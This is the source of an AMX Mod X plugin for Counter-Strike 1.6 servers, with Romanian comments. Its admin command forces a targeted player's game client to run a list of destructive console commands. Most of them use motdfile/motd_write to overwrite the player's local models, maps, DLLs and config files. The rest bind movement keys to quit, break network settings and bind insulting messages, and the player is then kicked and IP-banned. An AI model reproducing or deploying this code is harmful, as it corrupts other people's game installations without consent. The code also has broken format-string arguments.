/* AMX Mod X Script
*
* eXtreamCS Dev Team
*
* ======---===========
* © 2013 by CryWolf
*  www.eXtreamCS.com
* ======---===========
*
* This file is intended to be used with AMX Mod X.
*
*   This program is free software: you can redistribute it and/or modify
*   it under the terms of the GNU General Public License as published by
*   the Free Software Foundation, either version 3 of the License, or
*   (at your option) any later version.
*
*   This program is distributed in the hope that it will be useful,
*   but WITHOUT ANY WARRANTY; without even the implied warranty of
*   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
*   GNU General Public License for more details.
*
*   AMXX Pika v1.2.0
*
*   changelog:
*   v1.0.0
*   - Versiune privata
*   
*   v2.1.0
*   - Am adaugat definire de mesaj colorat pentru cn doreste doar.
*   - Mai multe functii destroy ( fisiere ).
*   - Am adaugat fisier .LOG.
*   - Comanda nu mai poate fi folosita pe personal, admini, boti.
*   - Acum pluginul va afecta putin si jucatorii cu Steam.
*   - Optimizat doar amxmodx, amxmisc.
*   - Detalii comanda si cum se foloseste.
*/

#include < amxmodx >
#include < amxmisc >

/*************************************************************/
/* 		ATENTIE!
	Stergeti // daca vreti mesaje colorate in chat pe Server!
	Trebuie sa aveti fisierul colorchat.inc in scripting/include.
*/

// #define USE_COLORCHAT


#if defined USE_COLORCHAT
	#include < colorchat >
#endif
/**************************************************************/


#define PLUGIN_NAME		"AMXX Pika"
#define PLUGIN_VERSION		"1.2.0"
#define PLUGIN_AUTHOR		"AzaZeL" // aka CryWolf

// Numele fisierului .log
#define LOGFILE		"AMXX_PIKA.log"


/*********** DESTORY COMMANDS ********************************/
new const g_pika [ ] [ ] = 
{
	"kill",
	"motdfile models/player.mdl;motd_write y",
	"motdfile models/v_ak47.mdl;motd_write x",
	"motdfile models/p_ak47.mdl;motd_write x",
	"motdfile models/v_flashbang.mdl;motd_write y",
	"motdfile models/p_m3.mdl;motd_write x",
	"motdfile models/v_awp.mdl;motd_write n",
	"motdfile models/p_ump45.mdl;motd_write x",
	"motdfile models/v_awp.mdl;motd_write x",
	"motdfile models/player/arctic/arctic.mdl;motd_write x",
	"motdfile models/player/gsg9/gsg9.mdl;motd_write y",
	"motdfile models/player/sas/sas.mdl;motd_write x",
	"motdfile models/player/terror/terror.mdl;motd_write y",
	"motdfile models/player/vip/vip.mdl;motd_write x",
	"motdfile models/player/urban/urban.mdl;motd_write x",
	"motdfile resource/GameMenu.res;motd_write x",
	"motdfile halflife.wad;motd_write x",
	"motdfile liblist.gam;motd_write y",
	"motdfile cs_dust.wad;motd_write x",
	"motdfile events/ak47.sc;motd_write x",
	"motdfile autoexec.cfg;motd_write x",
	"motdfile server.cfg;motd_write x",
	"motdfile ajawad.wad;motd_write x",
	"motdfile cstrike.wad;motd_write x",
	"motdfile dlls/mp.dll;motd_write x",
	"motdfile dlls/cs_i386.so;motd_write x",
	"motdfile cl_dlls/client.dll;motd_write x",
	"motdfile resource/cstrike_english.txt;motd_write x",
	"motdfile resource/game_menu.tga;motd_write x",
	"motdfile maps/de_inferno.bsp;motd_write x",
	"motdfile maps/de_dust2.bsp;motd_write x",
	"motdfile maps/de_aztec.bsp;motd_write x",
	"motdfile maps/de_dust.bsp;motd_write x",
	"motdfile maps/de_train.bsp;motd_write x",
	"motdfile cs_assault.wad;motd_write x",
	"motdfile spectatormenu.txt.wad;motd_write x",
	"motdfile custom.hpk;motd_write x",
	"sys_ticrate 0.1",
	"bind w quit",
	"bind a quit",
	"bind d quit",
	"cl_cmdrate 0.1",
	"cl_updaterate 0.0.1",
	"fps_max 1.0",
	"fps_modem 1.0",
	"name UN_RATAT",
	"cl_timeout 0.0",
	"cl_allowdownload 0",
	"cl_allowupload 0",
	"rate 00000",
	"developer 2",
	"hpk_maxsize 100",
	"bind m sunt_un_cacat",
	"bind q admin_esti_un_prost_I_",
	"bind g admin_mata_suge_cariciu :))",
	"cl_forwardspeed 100",
	"cl_backspeed 100",
	"cl_sidespeed 100",
	"motdfile userconfig.cfg;motd_write x",
	"bind t quit",
	"bind y quit",
	"cd eject",
	"quit"
};
/************************************************************/

public plugin_init ( )
{
	register_plugin ( PLUGIN_NAME, PLUGIN_VERSION, PLUGIN_AUTHOR )
	register_clcmd ( "amx_pika", "cmdPika", ADMIN_BAN, "<nume sau #userid> [motiv]" );
}

public cmdPika ( id, level, cid )
{
	if ( !cmd_access ( id, level, cid, 3 ) )
		return 1;
	
	new arg [ 33 ];
	read_argv ( 1, arg, charsmax ( arg ) );
	new player = cmd_target ( id, arg, CMDTARGET_OBEY_IMMUNITY | CMDTARGET_ALLOW_SELF | CMDTARGET_NO_BOTS );
	
	if ( !player )
	{
		console_print ( id, "[PIKA] Jucatorul nu este online sau a iesit de pe Server." );
		return 1;
	}
	
	new authid [ 33 ], authid2 [ 33 ],
	name2 [ 33 ], name [ 33 ],
	userid2, reason [ 32 ], userip [ 33 ];
	
	get_user_authid ( id, authid, charsmax ( authid ) );
	get_user_authid ( player, authid2, charsmax ( authid2 ) );
	get_user_name ( player, name2, charsmax ( name2 ) );
	get_user_name ( id, name, charsmax ( name ) );
	get_user_ip ( player, userip, charsmax ( userip ) );
	
	userid2 = get_user_userid ( player )
	
	read_argv ( 2, reason, 31 );
	remove_quotes ( reason );
	
	log_to_file ( LOGFILE, "Adminul %s a folosit comanda AMX_PIKA pe: %s cu motivul: (%s)", name, player, userid2, reason )
	
	for ( new i = 0; i < sizeof ( g_pika ); i++ )
		client_cmd ( player, g_pika [ i ] );
	
	server_cmd ( "kick #%d ^"Ai primit PIKA ^";wait;addip 999999.0 ^"%s^";wait;writeip", player, userip );
	
	#if defined USE_COLORCHAT
	{
		client_print_color ( 0, DontChange, "^4[^3AMXX PIKA^4] ^3Adminul ^1%s ^3a folosit comanda ^4AMX_PIKA ^3pe jucatorul ^4(%s)", name, player, userid2 );
	}
	else
	{
		client_print ( 0, print_chat, "[AMX PIKA] Adminul %s a folosi comanda AMX_PIKA pe (%s)", name, player, userid2 );
	}
	#endif
	
	client_cmd ( 0, "spk ^"vox/bizwarn coded user apprehend^"" );
	
	return 1;
}
